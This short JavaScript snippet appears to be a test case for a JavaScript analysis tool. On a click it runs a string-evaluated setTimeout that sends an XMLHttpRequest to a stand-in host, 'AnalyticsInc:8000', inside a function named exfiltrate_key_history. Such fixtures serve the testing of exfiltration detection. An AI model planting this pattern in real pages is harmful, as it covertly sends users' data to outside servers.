
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=timeout", true);xmlhttp.send(null);';
  setTimeout(exp, 10);
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
